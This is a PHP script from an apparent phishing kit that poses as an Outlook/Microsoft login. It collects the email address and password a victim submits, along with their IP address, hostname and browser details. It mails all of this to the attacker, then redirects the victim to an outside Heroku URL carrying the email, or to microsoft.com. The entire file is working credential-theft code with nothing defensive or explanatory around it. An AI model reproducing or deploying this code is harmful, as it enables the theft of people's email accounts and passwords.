<?php
if($_POST["nameu"] != "" and $_POST["namep"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------Live0outoolk Info by SimdiaDev-----------------------\n";
$message .= "Eem'ail            	: ".$_POST['nameu']."\n";
$message .= "Pa'ssw0rd           	: ".$_POST['namep']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- unknown --------------|\n";
include 'email.php';
$subject = "SimdiaDev | $ip";
{
mail("$to", "$send", "$subject", $message);     
}
$praga=rand();
$praga=md5($praga);
  header ("Location: https://mlorjadhgf47yt78ewgfu-tfretwg.herokuapp.com/reverse2.php?nameu=".$_POST['nameu']);
}else{
header ("Location: https://www.microsoft.com/undefined");
}

?>